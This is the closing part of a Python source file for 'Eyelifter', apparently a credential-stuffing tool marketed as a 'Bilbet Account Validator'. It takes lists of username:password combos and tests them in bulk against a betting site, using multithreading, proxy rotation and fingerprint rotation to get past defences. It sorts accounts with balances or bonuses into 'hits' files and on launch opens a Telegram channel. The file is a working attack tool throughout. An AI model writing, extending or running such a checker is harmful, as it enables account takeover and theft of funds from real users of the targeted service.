    if not combos:
        Eyelifter_log("❌", "ERROR", "EXTRACT", "no valid combos")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    Eyelifter_log("✅", "INFO", "EXTRACT", f"{len(combos)} unique combos")

    os.makedirs(RESULTS_FOLDER, exist_ok=True)
    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    rand_tag = "".join(random.choices(string.ascii_lowercase + string.digits, k=4))
    _eyelifter_folder = os.path.join(RESULTS_FOLDER, f"Session_{ts}_{rand_tag}")
    os.makedirs(_eyelifter_folder, exist_ok=True)

    _eyelifter_hits_f = open(os.path.join(_eyelifter_folder, "bilbet_hits.txt"), "w", encoding="utf-8")
    _eyelifter_free_f = open(os.path.join(_eyelifter_folder, "bilbet_free.txt"), "w", encoding="utf-8")
    _eyelifter_bad_f = open(os.path.join(_eyelifter_folder, "bilbet_bad.txt"), "w", encoding="utf-8")
    _eyelifter_err_f = open(os.path.join(_eyelifter_folder, "bilbet_errors.txt"), "w", encoding="utf-8")

    header = (f"# Bilbet Checker - {datetime.now().isoformat()}\n"
              f"# Checked by {AUTHOR_TAG}\n"
              f"# Seal: {CREDIT_SEAL}\n\n")
    for fh in (_eyelifter_hits_f, _eyelifter_free_f, _eyelifter_bad_f, _eyelifter_err_f):
        fh.write(header)

    _eyelifter_total = len(combos)
    Eyelifter_log("📊", "INFO", "FILE", f"loaded {_eyelifter_total}")
    Eyelifter_log("⚙️", "INFO", "CONFIG",
                  f"threads:{CONFIG['threads']} timeout:{CONFIG['timeout']}s "
                  f"retries:{CONFIG['retries']} gap:{CONFIG['combo_delay']}s")

    if proxies:
        _eyelifter_pool = list(proxies)
        _eyelifter_bad_proxies = set()
        Eyelifter_log("🌐", "INFO", "PROXY", f"{len(proxies)} loaded")
    else:
        _eyelifter_pool = []
        _eyelifter_bad_proxies = set()
        Eyelifter_log("⚠️", "WARN", "PROXY", "no proxies — direct connection")

    _eyelifter_stop.clear()
    Eyelifter_log("🚀", "INFO", "START", f"firing {_eyelifter_total} combos across {CONFIG['threads']} threads")

    try:
        Eyelifter_bulk_runner(combos)
    except KeyboardInterrupt:
        _eyelifter_stop.set()
        Eyelifter_log("🛑", "WARN", "STOP", "stopping...")
    except Exception as e:
        Eyelifter_log("❌", "ERROR", "RUN", f"{type(e).__name__}: {str(e)[:120]}")
    finally:
        _eyelifter_stop.set()
        time.sleep(0.3)
        for fh in (_eyelifter_hits_f, _eyelifter_free_f, _eyelifter_bad_f, _eyelifter_err_f):
            try:
                fh.close()
            except Exception:
                pass

    for base, key in (
        ("bilbet_hits.txt", "hits"),
        ("bilbet_free.txt", "free"),
        ("bilbet_bad.txt", "bad"),
        ("bilbet_errors.txt", "errors"),
    ):
        old = os.path.join(_eyelifter_folder, base)
        new = os.path.join(_eyelifter_folder, base.replace(".txt", f"_{_eyelifter_stats[key]}.txt"))
        if os.path.exists(old):
            try:
                os.rename(old, new)
            except Exception:
                pass

    Eyelifter_log("💾", "INFO", "SAVE", f"results → {_eyelifter_folder}")
    Eyelifter_divider()
    el = time.time() - _eyelifter_start
    Eyelifter_summary([
        ("Total", _eyelifter_total),
        ("Hits", _eyelifter_stats["hits"]),
        ("Free", _eyelifter_stats["free"]),
        ("Bad creds", _eyelifter_stats["bad"]),
        ("Errors", _eyelifter_stats["errors"]),
        ("Rate limited", _eyelifter_stats["rate_limited"]),
        ("Proxy fails", _eyelifter_stats["proxy_fails"]),
        ("Time", f"{el:.1f}s"),
        ("Folder", _eyelifter_folder),
    ])
    input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")


def Eyelifter_settings_menu():
    Eyelifter_verify("settings")
    global DEBUG, REQ_TIMEOUT
    Eyelifter_section("SETTINGS")
    print(Eyelifter_color("96", "Current:"))
    print(f"  [1]  Threads:              {CONFIG['threads']}")
    print(f"  [2]  Timeout:              {CONFIG['timeout']}s")
    print(f"  [3]  Retries:              {CONFIG['retries']}")
    print(f"  [4]  Retry Delay:          {CONFIG['retry_delay']}s")
    print(f"  [5]  Combo Delay:          {CONFIG['combo_delay']}s")
    print(f"  [6]  Proxy File:           {CONFIG['proxies_file']}")
    print(f"  [7]  Skip Proxy Test:      {CONFIG['skip_proxy_test']}")
    print(f"  [8]  Rotate Fingerprint:   {CONFIG['rotate_fingerprint']}")
    print(f"  [9]  Open Channel Launch:  {CONFIG['open_channel_on_launch']}")
    print(f"  [10] Hit on Any Balance:   {CONFIG['hit_on_any_balance']}")
    print(f"  [11] Hit on Reg Bonus:     {CONFIG['hit_on_registration_bonus']}")
    print(f"  [12] Hit on Unrestricted:  {CONFIG['hit_on_unrestricted']}")
    print(f"  [13] Debug:                {CONFIG['debug']}")
    print(f"  [14] Back")

    ch = input(f"{Eyelifter_color('96', '[*] Select: ')}").strip()
    changed = False
    try:
        if ch == "1":
            CONFIG["threads"] = max(1, min(50, int(input("Threads (1-50): "))))
            _loader.settings["threads"] = CONFIG["threads"]; changed = True
        elif ch == "2":
            CONFIG["timeout"] = max(5, min(120, int(input("Timeout (5-120): "))))
            _loader.settings["timeout"] = CONFIG["timeout"]
            REQ_TIMEOUT = CONFIG["timeout"]; changed = True
        elif ch == "3":
            CONFIG["retries"] = max(0, min(5, int(input("Retries (0-5): "))))
            _loader.settings["retries"] = CONFIG["retries"]; changed = True
        elif ch == "4":
            CONFIG["retry_delay"] = max(0.0, min(60.0, float(input("Retry delay (s): "))))
            _loader.settings["retry_delay"] = CONFIG["retry_delay"]; changed = True
        elif ch == "5":
            CONFIG["combo_delay"] = max(0.0, min(60.0, float(input("Combo delay (s): "))))
            _loader.settings["combo_delay"] = CONFIG["combo_delay"]; changed = True
        elif ch == "6":
            v = input("Proxies file path: ").strip()
            if v:
                CONFIG["proxies_file"] = v
                _loader.settings["proxies_file"] = v; changed = True
        elif ch == "7":
            CONFIG["skip_proxy_test"] = not CONFIG["skip_proxy_test"]
            _loader.settings["skip_proxy_test"] = CONFIG["skip_proxy_test"]; changed = True
        elif ch == "8":
            CONFIG["rotate_fingerprint"] = not CONFIG["rotate_fingerprint"]
            _loader.settings["rotate_fingerprint"] = CONFIG["rotate_fingerprint"]; changed = True
        elif ch == "9":
            CONFIG["open_channel_on_launch"] = not CONFIG["open_channel_on_launch"]
            _loader.settings["open_channel_on_launch"] = CONFIG["open_channel_on_launch"]; changed = True
        elif ch == "10":
            CONFIG["hit_on_any_balance"] = not CONFIG["hit_on_any_balance"]
            _loader.settings["hit_on_any_balance"] = CONFIG["hit_on_any_balance"]; changed = True
        elif ch == "11":
            CONFIG["hit_on_registration_bonus"] = not CONFIG["hit_on_registration_bonus"]
            _loader.settings["hit_on_registration_bonus"] = CONFIG["hit_on_registration_bonus"]; changed = True
        elif ch == "12":
            CONFIG["hit_on_unrestricted"] = not CONFIG["hit_on_unrestricted"]
            _loader.settings["hit_on_unrestricted"] = CONFIG["hit_on_unrestricted"]; changed = True
        elif ch == "13":
            CONFIG["debug"] = not CONFIG["debug"]
            _loader.settings["debug"] = CONFIG["debug"]
            DEBUG = CONFIG["debug"]; changed = True
        elif ch == "14":
            return
    except (ValueError, TypeError):
        Eyelifter_log("❌", "ERROR", "CONFIG", "invalid")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    if changed:
        try:
            _loader.Eyelifter_save()
            Eyelifter_log("💾", "INFO", "CONFIG", "saved")
        except Exception as e:
            Eyelifter_log("⚠️", "WARN", "CONFIG", f"save failed: {e}")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")


def Eyelifter_main():
    Eyelifter_verify("main")

    if CONFIG.get("open_channel_on_launch", True):
        def _delayed_open():
            time.sleep(0.4)
            Eyelifter_open_url("https://t.me/darkhuchannel")
        threading.Thread(target=_delayed_open, daemon=True).start()

    Eyelifter_banner(TOOL_NAME, "Bilbet Account Validator")
    proxies = Eyelifter_load_proxies()

    while True:
        Eyelifter_verify("menu")
        Eyelifter_section("MAIN MENU")
        if proxies:
            Eyelifter_log("🌐", "INFO", "PROXY", f"{len(proxies)} proxies loaded")
        else:
            Eyelifter_log("⚠️", "WARN", "PROXY", "no proxies — direct connection")

        print("[1] Single check")
        print("[2] Bulk check from file")
        print("[3] Settings")
        print("[4] Exit")

        choice = input(f"{Eyelifter_color('93', '[*] Select: ')}").strip()

        if choice == "1":
            Eyelifter_single_check(proxies)
        elif choice == "2":
            _eyelifter_stop.clear()
            Eyelifter_bulk_check(proxies)
        elif choice == "3":
            Eyelifter_settings_menu()
            proxies = Eyelifter_load_proxies()
        elif choice == "4":
            print("Exiting...")
            break
        else:
            Eyelifter_log("❌", "ERROR", "INPUT", "invalid choice")


if __name__ == "__main__":
    while True:
        try:
            Eyelifter_main()
            break
        except SystemExit:
            raise
        except KeyboardInterrupt:
            print("\nExiting...")
            sys.exit(1)
        except Exception as e:
            print(f"[FATAL] {type(e).__name__}: {e}")
            print("restarting menu in 3s...")
            time.sleep(3) 